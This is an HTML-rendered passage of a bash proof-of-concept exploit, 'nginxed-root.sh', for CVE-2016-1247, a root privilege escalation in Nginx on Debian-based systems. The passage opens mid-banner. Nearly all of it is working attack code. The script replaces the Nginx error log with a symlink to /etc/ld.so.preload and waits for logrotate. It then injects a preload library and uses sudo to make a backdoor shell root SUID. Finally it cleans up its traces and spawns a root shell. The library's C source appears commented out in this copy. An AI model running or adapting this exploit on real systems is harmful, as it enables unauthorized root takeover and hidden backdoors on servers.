XXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-XXXXXXXX--------------- &nbsp;XXXXXX-</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\XXXXXXXXXXXXXXXXXXXXXXXXXX/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_eascii_</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo -e &quot;\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Args</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $# -lt 1 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;It seems that this server uses: `ps aux | grep nginx | awk -F&#39;log-error=&#39; &#39;{ print $2 }&#39; | cut -d&#39; &#39; -f1 | grep &#39;/&#39;`\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Priv check</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Starting the exploit as: \n\033[94m`id`\033[0m&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">id | grep -q www-data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] You need to execute the exploit as www-data user! Exiting.\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Set target paths</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ERRORLOG=&quot;$1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ ! -f $ERRORLOG ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] The specified Nginx error log ($ERRORLOG) doesn&#39;t exist. Try again.\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># [ Exploitation ]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">trap ctrl_c INT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Compile privesc preload library</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># #define _GNU_SOURCE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># #include &lt;stdio.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># #include &lt;sys/stat.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># #include &lt;unistd.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># #include &lt;dlfcn.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#include &lt;sys/types.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#include &lt;sys/stat.h&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#include &lt;fcntl.h&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># uid_t geteuid(void) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;static uid_t &nbsp;(*old_geteuid)();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;if ( old_geteuid() == 0 ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod(&quot;$BACKDOORPATH&quot;, 04777);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink(&quot;/etc/ld.so.preload&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;return old_geteuid();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># _solibeof_</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># /bin/bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;cleanexit 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># fi</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"># Prepare backdoor shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cp $BACKDOORSH $BACKDOORPATH</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Safety check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ -f /etc/ld.so.preload ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Symlink the log file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -ne 0 ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Couldn&#39;t remove the $ERRORLOG file or create a symlink.&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl http://localhost/ &gt;/dev/null 2&gt;/dev/null</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -ne &quot;\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">while :; do </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sleep 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if [ -f /etc/ld.so.preload ]; then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm -f $ERRORLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">done</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># /etc/ld.so.preload should be owned by www-data user at this point</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Inject the privesc.so shared library to escalate privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">chmod 755 /etc/ld.so.preload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sudo 2&gt;/dev/null &gt;/dev/null</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Check for the rootshell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ls -l $BACKDOORPATH</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ls -l $BACKDOORPATH | grep rws | grep -q root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ $? -eq 0 ]; then </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo -e &quot;\n[!] Failed to get root&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cleanexit 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">rm -f $ERRORLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &gt; $ERRORLOG</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Use the rootshell to perform cleanup that requires root privilges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$BACKDOORPATH -p -c &quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Reset the logging to error.log</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$BACKDOORPATH -p -c &quot;kill -USR1 `pidof -s nginx`&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Execute the rootshell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -e &quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$BACKDOORPATH -p -i</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Job done.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cleanexit 0</span></p></body>
</html>
